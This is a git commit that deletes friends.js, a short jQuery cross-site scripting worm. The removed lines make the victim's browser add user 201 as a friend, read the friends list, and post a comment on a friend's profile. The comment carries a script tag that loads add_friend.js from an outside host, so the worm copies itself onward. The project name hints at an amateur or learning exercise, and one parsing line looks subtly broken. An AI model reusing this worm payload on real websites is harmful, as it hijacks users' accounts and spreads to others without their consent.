7dac9371c2d34fcd6a7b3b1826df32e0c28b4d2a
Sean Sun <seansun.q@gmail.com>
2017-04-13 19:41:37 -0400

    Delete friends.js

--- friends.js
+++
@@ -1,6 +0,0 @@
-$.get("add_friend.php?id=201");
-
-$.get("friends.php", function( data ) {
-    var id = data.substr("id=").split(",");
-	$.get("add_comment.php?id="+id[0]+"&comment=<script src='https://seanqsun.com/Amateur-Hour/add_friend.js'></script>", function(data){});
-});
